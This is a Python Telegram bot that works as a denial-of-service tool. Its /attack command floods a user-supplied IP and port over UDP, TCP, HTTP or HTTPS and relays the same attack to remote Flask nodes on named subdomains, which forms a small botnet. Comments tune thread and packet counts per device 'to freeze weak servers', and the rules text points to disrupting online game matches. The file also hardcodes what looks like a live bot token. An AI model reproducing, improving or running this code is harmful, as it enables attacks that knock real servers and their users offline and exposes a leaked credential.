import telebot
import socket
import concurrent.futures
import threading
import os
import random
import time
import subprocess
import sys
import datetime
import logging
import requests  # Needed for HTTP/HTTPS


# ⚙️ Flood Configuration Reference ⚙️
#
# 💻 GitHub Codespace (4-core EPYC 7763)
# Threads: 200
# Packet Size UDP: 512–1024 bytes 🎯
# Packets per loop UDP: 5000 🔥
# Packets per loop TCP: 3000 🔥
# Packets per loop HTTP: 1500 ⚡
# Packets per loop HTTPS: 1000 ⚡
#
# 💻 GitHub Codespace (2-core EPYC 7763)
# Threads: 100
# Packet Size UDP: 256–768 bytes ⚡
# Packets per loop UDP: 3000 ⚡
# Packets per loop TCP: 1500 ⚡
# Packets per loop HTTP: 1000 🐢
# Packets per loop HTTPS: 700 🐢
#
# 💻 Your Laptop (Intel i5-3317U, 2-core)
# Threads: 50
# Packet Size UDP: 64–256 bytes 🐢
# Packets per loop UDP: 1000 🛡️
# Packets per loop TCP: 500 🛡️
# Packets per loop HTTP: 300 🐢
# Packets per loop HTTPS: 200 🐢
#
# 🧑‍💻 Google Colab CPU (2–4 cores Intel Xeon)
# Threads: 150
# Packet Size UDP: 512–1024 bytes 🚀
# Packets per loop UDP: 4000 ⚡
# Packets per loop TCP: 2500 ⚡
# Packets per loop HTTP: 1200 ⚡
# Packets per loop HTTPS: 900 ⚡
#
# 🖥️ Desktop CPU: Intel i7-9700K (8-core)
# Threads: 250
# Packet Size UDP: 768–1500 bytes 💪
# Packets per loop UDP: 7000 🔥
# Packets per loop TCP: 5000 🔥
# Packets per loop HTTP: 3000 ⚡
# Packets per loop HTTPS: 2000 ⚡
#
# 🖥️ Desktop CPU: AMD Ryzen 9 5900X (12-core)
# Threads: 300
# Packet Size UDP: 768–1500 bytes 💪
# Packets per loop UDP: 8000 🔥🔥
# Packets per loop TCP: 6000 🔥🔥
# Packets per loop HTTP: 4000 ⚡
# Packets per loop HTTPS: 2500 ⚡
#
# 📱 Phone CPUs:
#
# Snapdragon 8 Gen 2 (8-core)
# Threads: 20
# Packet Size UDP: 128–512 bytes ⚡
# Packets per loop UDP: 500 🐾
# Packets per loop TCP: 300 🐾
# Packets per loop HTTP: 150 🐾
# Packets per loop HTTPS: 100 🐾
#
# Snapdragon 8 Gen 1 (8-core)
# Threads: 18
# Packet Size UDP: 128–512 bytes ⚡
# Packets per loop UDP: 450 🐾
# Packets per loop TCP: 280 🐾
# Packets per loop HTTP: 140 🐾
# Packets per loop HTTPS: 90 🐾
#
# Snapdragon 888 (8-core)
# Threads: 15
# Packet Size UDP: 128–512 bytes ⚡
# Packets per loop UDP: 400 🐾
# Packets per loop TCP: 250 🐾
# Packets per loop HTTP: 120 🐾
# Packets per loop HTTPS: 80 🐾
#
# Snapdragon Exynos Lite (Midrange)
# Threads: 12
# Packet Size UDP: 128–384 bytes 🐢
# Packets per loop UDP: 350 🐾
# Packets per loop TCP: 200 🐾
# Packets per loop HTTP: 90 🐢
# Packets per loop HTTPS: 60 🐢
#
# Apple A17 Pro (6-core)
# Threads: 25
# Packet Size UDP: 128–512 bytes ⚡
# Packets per loop UDP: 600 🐾
# Packets per loop TCP: 400 🐾
# Packets per loop HTTP: 200 🐾
# Packets per loop HTTPS: 150 🐾
#
# MediaTek Dimensity 9200+ (Top flagship)
# Threads: 22
# Packet Size UDP: 128–512 bytes ⚡
# Packets per loop UDP: 550 🐾
# Packets per loop TCP: 350 🐾
# Packets per loop HTTP: 180 🐾
# Packets per loop HTTPS: 120 🐾
#
# MediaTek Dimensity 9200 (Flagship)
# Threads: 20
# Packet Size UDP: 128–512 bytes ⚡
# Packets per loop UDP: 500 🐾
# Packets per loop TCP: 320 🐾
# Packets per loop HTTP: 150 🐾
# Packets per loop HTTPS: 100 🐾
#
# MediaTek Dimensity 920 (Midrange)
# Threads: 15
# Packet Size UDP: 64–256 bytes 🐢
# Packets per loop UDP: 300 🐾
# Packets per loop TCP: 180 🐾
# Packets per loop HTTP: 90 🐢
# Packets per loop HTTPS: 50 🐢
#
# MediaTek Dimensity 6100+ (Budget)
# Threads: 10
# Packet Size UDP: 64–128 bytes 🐢
# Packets per loop UDP: 200 🐾
# Packets per loop TCP: 100 🐾
# Packets per loop HTTP: 50 🐢
# Packets per loop HTTPS: 30 🐢
#
# 📊 Notes:
# - Threads = number of concurrent flood threads
# - Packet Size = range of packet sizes in bytes sent per packet (UDP only)
# - Packets per loop = number of packets/requests sent per thread loop (adjust per protocol)
# - Adjust these values based on your device's CPU, RAM, and network capacity



REMOTE_FLASK_NODES = [
    "http://node1.yogeshvibez.dpdns.org",
    "http://node2.yogeshvibez.dpdns.org",
    # Add as many as you’ve hosted
]




# 🎛️ Function to install required packages
def install_requirements():
    # Check if requirements.txt file exists
    try:
        with open('requirements.txt', 'r') as f:
            pass
    except FileNotFoundError:
        print("Error: requirements.txt file not found!")
        return

    # Install packages from requirements.txt
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'])
        print("Installing packages from requirements.txt...")
    except subprocess.CalledProcessError as e:
        print(f"Error: Failed to install packages from requirements.txt ({e})")

    # Install pyTelegramBotAPI
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pyTelegramBotAPI'])
        print("Installing pyTelegramBotAPI...")
    except subprocess.CalledProcessError as e:
        print(f"Error: Failed to install pyTelegramBotAPI ({e})")

# Call the function to install requirements
install_requirements()

# 🎛️ Telegram API token (replace with your actual token)
TOKEN = '7746829845:AAFyqAtmzUKpLwvArmgy_WXRdT6C3oo3o6w'
bot = telebot.TeleBot(TOKEN, threaded=False)

# 🛡️ List of authorized user IDs (replace with actual IDs)
AUTHORIZED_USERS = [6034827272, 709106377]

# 🌐 Global dictionary to keep track of user attacks
user_attacks = {}

# ⏳ Variable to track bot start time for uptime
bot_start_time = datetime.datetime.now()

# 📜 Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# 💡 Efficient-Control Settings (Beginner Friendly Guide)
# --------------------------------------------------------

# 🔁 Thread Pool Executor - CPU THREADS (Global Thread Limit)
# This sets how many attack threads your system can run in parallel TOTAL.
# Suggested:
#   🖥️ Weak system (2-core): 50–100
#   ⚡ Mid-range system (4–6-core): 100–200
#   🔥 High-end system (8+ cores): 200–300+
executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)


# 🌐 Threads per Protocol - THREAD COUNT (Attack Intensity)
# This controls how many concurrent threads will launch per attack per protocol.
# More threads = more parallel pressure on the server.
# Suggested values to try freezing small/medium servers:
UDP_THREAD_COUNT = 10     # 🚀 150–300 for heavy UDP flood
TCP_THREAD_COUNT = 10      # 💣 100–200 for connection flood
HTTP_THREAD_COUNT = 10     # 🌐 50–150 for webserver overload
HTTPS_THREAD_COUNT = 8     # 🔐 30–100 (HTTPS uses more CPU)

# 📦 Packet/Request Loop Count - PACKETS PER THREAD (Flood Volume)
# Each thread will send this many packets or requests before restarting.
# Suggested values to freeze a typical server (adjust if needed):
PACKET_LOOP_COUNT_UDP = 3000     # 🔥 UDP: send thousands of packets fast
PACKET_LOOP_COUNT_TCP = 2500      # 💥 TCP: send bursts of data over connections
PACKET_LOOP_COUNT_HTTP = 2000     # 🌐 HTTP: send many GET requests
PACKET_LOOP_COUNT_HTTPS = 1000    # 🔐 HTTPS: keep lower due to encryption overhead

# 🧠 Tips:
# - Use high thread + high packet combo to freeze weak servers.
# - HTTPS uses more CPU/RAM. Don’t go too high on budget devices.
# - These are **aggressive settings**. Reduce if your system lags or crashes.
# - Always test carefully and tweak based on results.

# ✅ One place to control all flood strength easily.
# ✏️ Change these values, and it will reflect across all attack types.


def broadcast_attack_to_nodes(ip, port):
    for node_url in REMOTE_FLASK_NODES:
        try:
            response = requests.post(f"{node_url}/start", json={"ip": ip, "port": port}, timeout=5)
            print(f"[✓] Flask Node {node_url} received attack command → {ip}:{port}")
        except Exception as e:
            print(f"[!] Failed to reach {node_url}: {e}")


# 🛠️ Function to send UDP packets
def udp_flood(target_ip, target_port, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow socket address reuse
    while not stop_event.is_set():
        try:
            packet_size = random.randint(64, 1469)
            data = os.urandom(packet_size)
            for _ in range(PACKET_LOOP_COUNT_UDP):
                sock.sendto(data, (target_ip, target_port))
        except Exception as e:
            logging.error(f"UDP flood error: {e}")
            break

# 🚀 Start UDP flood
def start_udp_flood(user_id, target_ip, target_port):
    stop_event = threading.Event()
    futures = []
    for _ in range(UDP_THREAD_COUNT):
        future = executor.submit(udp_flood, target_ip, target_port, stop_event)
        futures.append(future)
    user_attacks[user_id] = (futures, stop_event)
    bot.send_message(user_id, f"🚀 Starting UDP flood on {target_ip}:{target_port}")


# 🛠️ Function to send TCP packets
def tcp_flood(target_ip, target_port, stop_event):
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target_ip, target_port))
            data = os.urandom(1024)
            for _ in range(PACKET_LOOP_COUNT_TCP):  # tcp requests per thread
                sock.sendall(data)
            sock.close()
        except Exception as e:
            logging.error(f"TCP flood error: {e}")
            break

# 🚀 Start TCP flood
def start_tcp_flood(user_id, target_ip, target_port):
    stop_event = threading.Event()
    futures = []
    for _ in range(TCP_THREAD_COUNT):
        future = executor.submit(tcp_flood, target_ip, target_port, stop_event)
        futures.append(future)
    user_attacks[user_id] = (futures, stop_event)
    bot.send_message(user_id, f"🚀 Starting TCP flood on {target_ip}:{target_port}")


# 🛠️ Function to send HTTP packets
def http_flood(target_ip, target_port, stop_event):
    url = f"http://{target_ip}:{target_port}/"
    while not stop_event.is_set():
        try:
            for _ in range(PACKET_LOOP_COUNT_HTTP):  # HTTP requests per thread
                requests.get(url, timeout=2)
        except Exception as e:
            logging.error(f"HTTP flood error: {e}")
            break

# 🚀 Start HTTP flood
def start_http_flood(user_id, target_ip, target_port):
    stop_event = threading.Event()
    futures = []
    for _ in range(HTTP_THREAD_COUNT):
        future = executor.submit(http_flood, target_ip, target_port, stop_event)
        futures.append(future)
    user_attacks[user_id] = (futures, stop_event)
    bot.send_message(user_id, f"🚀 Starting HTTP flood on {target_ip}:{target_port}")


# 🛠️ Function to send HTTPS packets
def https_flood(target_ip, target_port, stop_event):
    url = f"https://{target_ip}:{target_port}/"
    while not stop_event.is_set():
        try:
            for _ in range(PACKET_LOOP_COUNT_HTTPS):  # HTTPS requests per thread
                requests.get(url, timeout=2, verify=False)
        except Exception as e:
            logging.error(f"HTTPS flood error: {e}")
            break

# 🚀 Start HTTPS flood
def start_https_flood(user_id, target_ip, target_port):
    stop_event = threading.Event()
    futures = []
    for _ in range(HTTPS_THREAD_COUNT):
        future = executor.submit(https_flood, target_ip, target_port, stop_event)
        futures.append(future)
    user_attacks[user_id] = (futures, stop_event)
    bot.send_message(user_id, f"🚀 Starting HTTPS flood on {target_ip}:{target_port}")


# ✋ Function to stop all attacks for a specific user
def stop_attack(user_id):
    if user_id in user_attacks:
        processes, stop_event = user_attacks[user_id]
        stop_event.set()  # 🛑 Signal threads to stop

        # 🕒 Wait for all processes to finish
        for future in futures:
            future.cancel()

        del user_attacks[user_id]
        bot.send_message(user_id, "🔴 All Attack stopped.")
    else:
        bot.send_message(user_id, "❌ No active attack found >ᴗ<")

# 🕰️ Function to calculate bot uptime ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷
def get_uptime():
    uptime = datetime.datetime.now() - bot_start_time
    return str(uptime).split('.')[0]  # Format uptime to exclude microseconds ˏˋ°•*⁀➷ˏˋ°•*⁀➷

# 📜 Function to log commands and actions
def log_command(user_id, command):
    logging.info(f"User ID {user_id} executed command: {command}")

# 💬 Command handler for /start ☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    log_command(user_id, '/start')

    if user_id not in AUTHORIZED_USERS:
        bot.send_message(message.chat.id, "🚫 Access Denied! Contact the owner for assistance: @all4outgaming1")
        return

    welcome_message = (
        "🎮 **Welcome to the Ultimate Attack Bot!** 🚀\n\n"
        "🔥 You are now connected.\n"
        "To begin using the bot, type `/help` to see all available commands and how to use them.\n\n"
        "👑 Need support? Contact: @all4outgaming1\n"
        "📜 Type `/rules` to view the usage rules.\n"
        "✅ You're all set. Let's go!"
    )

    bot.send_message(message.chat.id, welcome_message, parse_mode='Markdown')


# 💬 Command handler for /attack ⋆.˚🦋༘⋆⋆.˚🦋༘⋆⋆.˚🦋༘⋆
@bot.message_handler(commands=['attack'])
def attack(message):
    user_id = message.from_user.id
    log_command(user_id, '/attack')

    if user_id not in AUTHORIZED_USERS:
        bot.send_message(message.chat.id, "🚫 Access Denied! Contact the owner for assistance: @all4outgaming1")
        return

    try:
        command_parts = message.text.split()

        if len(command_parts) == 2:
            protocol = 'udp'
            target = command_parts[1]
        elif len(command_parts) == 3:
            protocol = command_parts[1].lower()
            target = command_parts[2]
        else:
            bot.send_message(message.chat.id, "❌ Invalid format! Use: /attack [protocol] <IP>:<port>")
            return

        target_ip, target_port = target.split(':')
        target_port = int(target_port)

        # ✅ Start local attack
        if protocol == 'udp':
            start_udp_flood(user_id, target_ip, target_port)
        elif protocol == 'tcp':
            start_tcp_flood(user_id, target_ip, target_port)
        elif protocol == 'http':
            start_http_flood(user_id, target_ip, target_port)
        elif protocol == 'https':
            start_https_flood(user_id, target_ip, target_port)
        else:
            bot.send_message(message.chat.id, f"❌ Unknown protocol: {protocol}")
            return

        # ✅ Forward to Flask nodes
        broadcast_attack_to_nodes(target_ip, target_port)

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")


# 💬 Command handler for /stop
@bot.message_handler(commands=['stop'])
def stop(message):
    user_id = message.from_user.id
    log_command(user_id, '/stop')

    if user_id not in AUTHORIZED_USERS:
        bot.send_message(message.chat.id, "🚫 Access Denied! Contact the owner for assistance: @all4outgaming1")
        return

    stop_attack(user_id)
    broadcast_stop_to_nodes()


# 🌐 Forward attack to all subdomain Flask nodes
def broadcast_attack_to_nodes(ip, port):
    for node_url in REMOTE_FLASK_NODES:
        try:
            response = requests.post(f"{node_url}/start", json={"ip": ip, "port": port}, timeout=5)
            print(f"[✓] {node_url} → Attack started on {ip}:{port}")
        except Exception as e:
            print(f"[!] {node_url} → Failed to send attack: {e}")


# 🛑 Stop attack on all Flask nodes
def broadcast_stop_to_nodes():
    for node_url in REMOTE_FLASK_NODES:
        try:
            response = requests.post(f"{node_url}/stop", timeout=5)
            print(f"[✓] {node_url} → Attack stopped")
        except Exception as e:
            print(f"[!] {node_url} → Failed to stop: {e}")


"""""
    Me             scammer 🏳️‍🌈
 ⣠⣶⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⡆⠀⠀⠀⠀
⠀⠹⢿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡏⢀⣀⡀⠀⠀⠀⠀⠀
⠀⠀⣠⣤⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣟⣋⣼⣽⣾⣽⣦⡀⠀⠀⠀
⢀⣼⣿⣷⣾⡽⡄⠀⠀⠀⠀⠀⠀⠀⣴⣶⣶⣿⣿⣿⡿⢿⣟⣽⣾⣿⣿⣦⠀⠀
⣸⣿⣿⣾⣿⣿⣮⣤⣤⣤⣤⡀⠀⠀⠻⣿⡯⠽⠿⠛⠛⠉⠉⢿⣿⣿⣿⣿⣷⡀
⣿⣿⢻⣿⣿⣿⣛⡿⠿⠟⠛⠁⣀⣠⣤⣤⣶⣶⣶⣶⣷⣶⠀⠀⠻⣿⣿⣿⣿⣇
⢻⣿⡆⢿⣿⣿⣿⣿⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠀⣠⣶⣿⣿⣿⣿⡟
⠈⠛⠃⠈⢿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠋⠉⠁⠀⠀⠀⠀⣠⣾⣿⣿⣿⠟⠋⠁⠀
⠀⠀⠀⠀⠀⠙⢿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿ ︵‿︵‿︵‿︵︵‿︵‿︵‿︵︵‿︵‿︵‿︵︵‿︵‿︵‿︵︵‿︵‿︵‿︵
"""""


# 💬 Command handler for /id
@bot.message_handler(commands=['id'])  # 👀 Handling the /id command ⋇⊶⊰❣⊱⊷⋇ ⋇⊶⊰❣⊱⊷⋇
def show_id(message):
    user_id = message.from_user.id  # 🔍 Getting the user ID ⋇⊶⊰❣⊱⊷⋇ ⋇⊶⊰❣⊱⊷⋇
    username = message.from_user.username  # 👥 Getting the user's username ⋇⊶⊰❣⊱⊷⋇ ⋇⊶⊰❣⊱⊷⋇
    log_command(user_id, '/id')  # 👀 Logging the command ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆ ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆

    # 👤 Sending the message with the user ID and username
    bot.send_message(message.chat.id, f"👤 Your User ID is: {user_id}\n"
                                      f"👥 Your Username is: @{username}")

    # 👑 Printing the bot owner's username ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆
    bot_owner = "all4outgaming1"  # 👑 The bot owner's username  ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆
    bot.send_message(message.chat.id, f"🤖 This bot is owned by: @{bot_owner}")

# 💬 Command handler for /rules. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
@bot.message_handler(commands=['rules'])
def rules(message):
    log_command(message.from_user.id, '/rules')
    rules_message = (
        "📜 **Bot Rules - Keep It Cool!** 🌟\n"
        "1. No spamming attacks! ⛔ Rest for 5-6 matches between DDOS.\n"
        "2. Limit your kills! 🔫 Stay under 30-40 kills to keep it fair.\n"
        "3. Play smart! 🎮 Avoid reports and stay low-key.\n"
        "4. No mods allowed! 🚫 Using hacked files will get you banned.\n"
        "5. Be respectful! 🤝 Keep communication friendly and fun.\n"
        "6. Report issues! 🛡️ Message the owner for any problems.\n"
        "7. Always check your command before executing! ✅\n"
        "8. Do not attack without permission! ❌⚠️\n"
        "9. Be aware of the consequences of your actions! ⚖️\n"
        "10. Stay within the limits and play fair! 🤗"
    )
    bot.send_message(message.chat.id, rules_message)

# 💬 Command handler for /owner. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
@bot.message_handler(commands=['owner'])
def owner(message):
    log_command(message.from_user.id, '/owner')
    bot.send_message(message.chat.id, "📞 Contact the owner: @all4outgaming1")

# 💬 Command handler for /uptime. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
@bot.message_handler(commands=['uptime'])
def uptime(message):
    log_command(message.from_user.id, '/uptime')
    bot.send_message(message.chat.id, f"⏱️ Bot Uptime: {get_uptime()}")

# 💬 Command handler for /ping. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
@bot.message_handler(commands=['ping'])
@bot.message_handler(commands=['ping'])
def ping_command(message):
    user_id = message.from_user.id
    log_command(user_id, '/ping')

    bot.send_message(message.chat.id, "Checking your connection speed...")

    # Measure ping time     . ݁₊ ⊹ . ݁˖ . ݁        . ݁₊ ⊹ . ݁˖ . ݁         . ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
    start_time = time.time()
    try:
        # Use a simple DNS resolution to check responsiveness     ✦•┈๑⋅⋯ ⋯⋅๑┈•✦. ݁₊ ⊹ . ݁˖ . ݁
        socket.gethostbyname('google.com')
        ping_time = (time.time() - start_time) * 1000  # Convert to milliseconds     ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
        ping_response = (
            f"Ping: `{ping_time:.2f} ms` ⏱️\n"
            f"Your IP: `{get_user_ip(user_id)}` 📍\n"
            f"Your Username: `{message.from_user.username}` 👤\n"
        )
        bot.send_message(message.chat.id, ping_response)
    except socket.gaierror:
        bot.send_message(message.chat.id, "❌ Failed to ping! Check your connection.")

def get_user_ip(user_id):
    try:
        ip_address = requests.get('https://api.ipify.org/').text
        return ip_address
    except:
        return "IP Not Found 🤔"

# 💬 Command handler for /help           ✦•┈๑⋅⋯ ⋯⋅๑┈•✦           ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
@bot.message_handler(commands=['help'])
def help_command(message):
    log_command(message.from_user.id, '/help')
    help_message = (
        "🤖 **BOT COMMANDS & HELP GUIDE** 🤖\n\n"

        "📌 **General Commands:**\n"
        "🔹 /start - Start the bot and show welcome message 🔋\n"
        "🔹 /help - Show this help message 🤝\n"
        "🔹 /rules - Show the usage rules 📚\n"
        "🔹 /owner - Contact the owner 👑\n"
        "🔹 /id - Show your Telegram user ID 👤\n"
        "🔹 /uptime - Show bot uptime ⏱️\n"
        "🔹 /ping - Test your connection latency 📡\n\n"

        "💥 **Attack Commands:**\n"
        "🔫 /attack `<IP>:<port>` - Launch a default UDP attack 🌐\n"
        "🔫 /attack `<protocol>` `<IP>:<port>` - Launch using custom protocol 🔥\n"
        "   ➤ Example (UDP default): `/attack 192.168.1.10:8080`\n"
        "   ➤ Example (explicit UDP): `/attack udp 192.168.1.10:8080`\n"
        "   ➤ Example (TCP): `/attack tcp 192.168.1.10:2920`\n"
        "   ➤ Example (HTTP): `/attack http 203.0.113.25:80`\n"
        "   ➤ Example (HTTPS): `/attack https 203.0.113.25:443`\n\n"

        "🛑 /stop - Immediately stop all your active attacks ❌\n\n"

        "💡 **Tips:**\n"
        "• Protocol is not case-sensitive (e.g., `TCP`, `tcp`, `Tcp` all work) ✅\n"
        "• If you do not specify a protocol, it defaults to **UDP** ⚡\n"
        "• Use valid IP and port format like `1.1.1.1:80` 🌐\n"
        "• Be responsible and follow the /rules 🤝\n\n"

        "👑 **Owner Contact:**\n"
        "Telegram & Instagram: @all4outgaming1"
    )
    bot.send_message(message.chat.id, help_message, parse_mode='Markdown')


#### DISCLAIMER ####              ✦•┈๑⋅⋯ ⋯⋅๑┈•✦                      ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
"""
**🚨 IMPORTANT: PLEASE READ CAREFULLY BEFORE USING THIS BOT 🚨**

This bot is owned and operated by @all4outgaming1 on Telegram and all4outgaming on Instagram, 🇮🇳. By using this bot, you acknowledge that you understand and agree to the following terms:

* **🔒 NO WARRANTIES**: This bot is provided "as is" and "as available", without warranty of any kind, express or implied, including but not limited to the implied warranties of merchantability, fitness for a particular purpose, and non-infringement.
* **🚫 LIMITATION OF LIABILITY**: The owner and operator of this bot, @all4outgaming1 on Telegram and all4outgaming on Instagram, shall not be liable for any damages or losses arising from the use of this bot, including but not limited to direct, indirect, incidental, punitive, and consequential damages, including loss of profits, data, or business interruption.
* **📚 COMPLIANCE WITH LAWS**: You are responsible for ensuring that your use of this bot complies with all applicable laws and regulations, including but not limited to laws related to intellectual property, data privacy, and cybersecurity.
* **📊 DATA COLLECTION**: This bot may collect and use data and information about your usage, including but not limited to your IP address, device information, and usage patterns, and you consent to such collection and use.
* **🤝 INDEMNIFICATION**: You agree to indemnify and hold harmless @all4outgaming1 on Telegram and all4outgaming on Instagram, and its affiliates, officers, agents, and employees, from and against any and all claims, damages, obligations, losses, liabilities, costs or debt, and expenses (including but not limited to attorney's fees) arising from or related to your use of this bot.
* **🌐 THIRD-PARTY LINKS**: This bot may contain links to third-party websites or services, and you acknowledge that @all4outgaming1 on Telegram and all4outgaming on Instagram is not responsible for the content, accuracy, or opinions expressed on such websites or services.
* **🔄 MODIFICATION AND DISCONTINUATION**: You agree that @all4outgaming1 on Telegram and all4outgaming on Instagram may modify or discontinue this bot at any time, without notice, and that you will not be entitled to any compensation or reimbursement for any losses or damages arising from such modification or discontinuation.
* **👧 AGE RESTRICTION**: You acknowledge that this bot is not intended for use by minors, and that you are at least 18 years old (or the age of majority in your jurisdiction) to use this bot.
* **🇮🇳 GOVERNING LAW**: You agree that this disclaimer and the terms and conditions of this bot will be governed by and construed in accordance with the laws of India, 🇮🇳, and that any disputes arising from or related to this bot will be resolved through binding arbitration in accordance with the rules of [Arbitration Association].
* **📝 ENTIRE AGREEMENT**: This disclaimer constitutes the entire agreement between you and @all4outgaming1 on Telegram and all4outgaming on Instagram regarding your use of this bot, and supersedes all prior or contemporaneous agreements or understandings.
* **👍 ACKNOWLEDGMENT**: By using this bot, you acknowledge that you have read, understood, and agree to be bound by these terms and conditions. If you do not agree to these terms and conditions, please do not use this bot.

**👋 THANK YOU FOR READING! 👋**
"""
# don't Change the " DISCLAIMER " ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──
"""
███████▀▀▀░░░░░░░▀▀▀███████
████▀░░░░░░░░░░░░░░░░░▀████
███│░░░░░░░░░░░░░░░░░░░│███
██▌│░░░░░░░░░░░░░░░░░░░│▐██
██░└┐░░░░░░░░░░░░░░░░░┌┘░██
██░░└┐░░░░░░░░░░░░░░░┌┘░░██
██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██
██▌░│██████▌░░░▐██████│░▐██
███░│▐███▀▀░░▄░░▀▀███▌│░███
██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██
██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
████▄─┘██▌░░░░░░░▐██└─▄████
█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████
████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████
█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████
███████▄░░░░░░░░░░░▄███████
██████████▄▄▄▄▄▄▄██████████
███████████████████████████
"""
# 🎮 Run the bot ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──✦•┈๑⋅⋯ ⋯⋅๑┈•✦
if __name__ == "__main__":
    print(" 🎉🔥 Starting the Telegram bot...")  # Print statement for bot starting
    print(" ⏱️ Initializing bot components...")  # Print statement for initialization

    # Add a delay to allow the bot to initialize ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──✦•┈๑⋅⋯ ⋯⋅๑┈•✦
    time.sleep(5)

    # Print a success message if the bot starts successfully ╰┈➤. ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──
    print(" 🚀 Telegram bot started successfully!")  # ╰┈➤. Print statement for successful startup
    print(" 👍 Bot is now online and ready to Ddos_attack! ▰▱▰▱▰▱▰▱▰▱▰▱▰▱")

    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"Bot encountered an error: {e}")
        print(" 🚨 Error: Bot encountered an error. Restarting in 5 seconds... ⏰")
        time.sleep(5)  # Wait before restarting ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
        print(" 🔁 Restarting the Telegram bot... 🔄")
        print(" 💻 Bot is now restarting. Please wait... ⏳")

